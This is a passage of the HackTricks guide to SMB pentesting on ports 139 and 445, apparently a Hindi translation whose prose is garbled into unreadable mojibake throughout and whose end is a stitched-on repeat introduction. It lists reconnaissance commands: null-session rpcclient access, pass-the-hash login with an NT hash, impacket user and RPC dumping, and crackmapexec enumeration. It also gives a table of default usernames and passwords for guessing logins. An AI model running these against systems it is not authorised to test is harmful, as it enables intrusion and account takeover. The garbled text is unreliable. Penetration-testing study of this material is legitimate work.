# 139,445 - SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>

## **рдкреЛрд░реНрдЯ 139**

**NetBIOS** рдХрд╛ рдЕрд░реНрде рд╣реЛрддрд╛ рд╣реИ _рдиреЗрдЯрд╡рд░реНрдХ рдмреЗрд╕рд┐рдХ рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рд╕рд┐рд╕реНрдЯрдо_. рдпрд╣ рдПрдХ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдХреНрд╖реЗрддреНрд░ рдиреЗрдЯрд╡рд░реНрдХ (LAN) рдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди, рдкреАрд╕реА рдФрд░ рдбреЗрд╕реНрдХрдЯреЙрдк рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдбреЗрдЯрд╛ рдкреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред NetBIOS рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдкрдиреЗ NetBIOS рдирд╛рдореЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рджреВрд╕рд░реЗ рдХреЛ рдЦреЛрдЬрддреЗ рд╣реИрдВ рдФрд░ рдкрд╣рдЪрд╛рдирддреЗ рд╣реИрдВред рдПрдХ NetBIOS рдирд╛рдо 16 рд╡рд░реНрдгреЛрдВ рддрдХ рд▓рдВрдмрд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЖрдорддреМрд░ рдкрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдо рд╕реЗ рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди (рдХреНрд▓рд╛рдЗрдВрдЯ) рдПрдХ рдЕрдиреНрдп рдХреНрд▓рд╛рдЗрдВрдЯ (рд╕рд░реНрд╡рд░) рдХреЛ "рдХреЙрд▓" рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдорд╛рдВрдб рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ рджреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ NetBIOS рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ (рдЯреАрд╕реАрдкреА рдкреЛрд░реНрдЯ 139 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред (рдпрд╣рд╛рдВ рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рд╣реИ [рдпрд╣рд╛рдВ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for))
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## рдкреЛрд░реНрдЯ 445

рдЬрдмрдХрд┐ рдкреЛрд░реНрдЯ 139 рдХреЛ рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ 'NBT over IP' рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреЛрд░реНрдЯ 445 рдХреЛ 'SMB over IP' рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред **SMB** рдХрд╛ рдорддрд▓рдм рд╣реИ '**Server Message Blocks**'ред рдЖрдзреБрдирд┐рдХ рднрд╛рд╖рд╛ рдореЗрдВ рд╕рд░реНрд╡рд░ рдореИрд╕реЗрдЬ рдмреНрд▓реЙрдХ рдХреЛ 'рдХреЙрдорди рдЗрдВрдЯрд░рдиреЗрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо' рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ, рдкреНрд░рд┐рдВрдЯрд░реЛрдВ, рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯреНрд╕ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдиреЛрдб рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЭрд╛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд▓реЗрдпрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Windows рдкрд░, SMB TCP/IP рдХреЗ рдмрд┐рдирд╛ рд╕реАрдзреЗ TCP/IP рдкрд░ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИред рдЬреИрд╕рд╛ рдХрд┐ рдЖрдкрдиреЗ рдмрддрд╛рдпрд╛ рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯ 445 рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛ред рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, рдЖрдк рдкреЛрд░реНрдЯ 139 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рд╕реЗрд╡рд╛рдПрдВ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдкрд╛рдПрдВрдЧреЗред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ SMB NetBIOS over TCP/IP рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣рд╛ рд╣реИ\*\*ред\*\* (рдпрд╣рд╛рдВ рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рд╣реИ: [рдпрд╣рд╛рдВ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for))
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

рд╕рд░реНрд╡рд░ рд╕рдВрджреЗрд╢ рдмреНрд▓реЙрдХ (`SMB`) рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ **рдлрд╝рд╛рдЗрд▓реЛрдВ** рдФрд░ рдкреВрд░реЗ рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдЬреИрд╕реЗ рдкреНрд░рд┐рдВрдЯрд░, рд░рд╛рдЙрдЯрд░ рдпрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рддрдХ рдХрд╛ **рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░рддрд╛ рд╣реИред рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдореБрдЦреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреНрд╖реЗрддреНрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **Windows** рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рд╢реНрд░реГрдВрдЦрд▓рд╛ рд░рд╣реА рд╣реИ, рдЬрд┐рд╕рдХреА рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ SMB рдХрд╛ рд╕рдорд░реНрдерди рдПрдХ рдиреАрдЪреЗ рдХреЗ рд╕рдВрдЧрдд рддрд░реАрдХреЗ рд╕реЗ рдХрд░рддреА рд╣реИрдВ - рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдг рдЖрд╕рд╛рдиреА рд╕реЗ рдкреБрд░рд╛рдиреЗ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд╛рдкрд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**Samba** рдирд╛рдордХ рдореБрдлреНрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд╕рд╛рде, рд▓рд┐рдирдХреНрд╕ рдФрд░ рдпреВрдирд┐рдХреНрд╕ рд╡рд┐рддрд░рдгреЛрдВ рдореЗрдВ SMB рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдФрд░ рдЗрд╕рд▓рд┐рдП SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рднреА рд╣реИред

рдПрдХ SMB рд╕рд░реНрд╡рд░ **рдЕрдкрдиреЗ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЛ рд╢реЗрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд╛рди** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП **рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рд╡рд╛рд▓реА рдкрджрд╛рдиреБрдХреНрд░рдо** рдЖрдВрд╢рд┐рдХ рд░реВрдк рд╕реЗ **рд╕рд░реНрд╡рд░** рдкрд░ **рд╕рдВрд░рдЪрдирд╛** рд╕реЗ **рд╕реНрд╡рддрдВрддреНрд░** рд╣реЛрддреА рд╣реИред **рдкрд╣реБрдВрдЪ рдЕрдзрд┐рдХрд╛рд░** `рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд╕реВрдЪреА` (`ACL`) рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рд╡реЗ рдПрдХ **рдмрд╛рд░реАрдХреА рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд** рддрд░реАрдХреЗ рд╕реЗ **`рдПрдХреНрд╕реАрдХреНрдпреВрдЯ`**, **`рдкрдврд╝реЗрдВ`**, рдФрд░ **`рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ`** рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдореВрд╣реЛрдВ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред **ACLs** **рд╢реЗрдпрд░реЛрдВ** рдкрд░ **рдкрд░рд┐рднрд╛рд╖рд┐рдд** рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд╕рд░реНрд╡рд░ рдкрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреЗ рд╣реИрдВред

### IPC$ рд╢реЗрдпрд░

рдкреБрд╕реНрддрдХ _**рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди 3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг**_ рд╕реЗ

рдПрдХ рдЧреБрдордирд╛рдо рд╢реВрдиреНрдп рд╕рддреНрд░ рдХреЗ рд╕рд╛рде рдЖрдк IPC$ рд╢реЗрдпрд░ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд╛рдорд┐рдд рдкрд╛рдЗрдкреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрднрд░рддреА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Kali Linux рдореЗрдВ enum4linux рдЙрдкрдпреЛрдЧреА рд╣реИ; рдЗрд╕рдХреЗ рд╕рд╛рде, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЬрд╛рдирдХрд╛рд░реА
* рдорд╛рддрд╛-рдкрд┐рддрд╛ рдбреЛрдореЗрди рдХрд╛ рд╡рд┐рд╡рд░рдг
* рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреА рд╕реВрдЪреА
* рдЙрдкрд▓рдмреНрдз SMB рд╢реЗрдпрд░реЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг
* рдкреНрд░рднрд╛рд╡реА рд╕рд┐рд╕реНрдЯрдо рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐

## NTLM рдХреНрдпрд╛ рд╣реИ

рдЕрдЧрд░ рдЖрдкрдХреЛ NTLM рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдкреГрд╖реНрда рдмрд╣реБрдд рд░реЛрдЪрдХ рд▓рдЧреЗрдЧрд╛ рдЬрд╣рд╛рдВ **NTLM** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрд╣ рднреА рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕рдХрд╛ рд▓рд╛рдн рдХреИрд╕реЗ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **рд╕рд░реНрд╡рд░ рдЬрд╛рдВрдЪ**

### **рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ** рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреИрди рдХрд░реЗрдВ:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB рд╕рд░реНрд╡рд░ рд╕рдВрд╕реНрдХрд░рдг

SMB рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЬрд╛рдирд╛ рдЬрд╛рдП рдХрд┐ рдХреМрди рд╕рд╛ рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рддреЛ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **MSF** рдЕрддрд┐рд░рд┐рдХреНрдд рдореЙрдбреНрдпреВрд▓ \_**auxiliary/scanner/smb/smb\_version** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* рдпрд╛ рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **рдЦреЛрдЬ рд╢реЛрдз**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **рд╕рдВрднрд╛рд╡рд┐рдд** рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

| **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** | **рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб** |
| -------------------- | --------------------- |
| _(рдЦрд╛рд▓реА)_            | _(рдЦрд╛рд▓реА)_             |
| guest                | _(рдЦрд╛рд▓реА)_             |
| Administrator, admin | _(рдЦрд╛рд▓реА)_, рдкрд╛рд╕рд╡рд░реНрдб, administrator, admin |
| arcserve             | arcserve, backup      |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin |
| backupexec, backup   | backupexec, backup, arcada |
| test, lab, demo      | рдкрд╛рд╕рд╡рд░реНрдб, test, lab, demo |

### SMB рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реВрдЪрдирд╛

### рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ, рд╕рдореВрд╣реЛрдВ рдФрд░ рд▓реЙрдЧ рдЗрди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ


# рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдкрд╣рд▓реЗ рд╕реЗ рд╣реА enum4linux рдФрд░ enum4linux-ng рд╕реЗ рдЗрдХрдЯреНрдард╛ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП SMB

## SMB рдХреНрдпрд╛ рд╣реИ?
SMB (Server Message Block) рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдФрд░ рдкреНрд░рд┐рдВрдЯрд░ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ Windows рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреНрдпреЛрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ?
SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд░реНрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдХрдорд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЙрдиреНрд╣реЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдбреЗрдЯрд╛ рдХреЛ рдЪреЛрд░реА рдХрд░рдиреЗ, рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

## SMB рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЯреЗрдХреНрдирд┐рдХреНрд╕
1. SMB рд╡рд░реНрдЬрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
2. рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ SMB рд╢реЗрдпрд░реНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
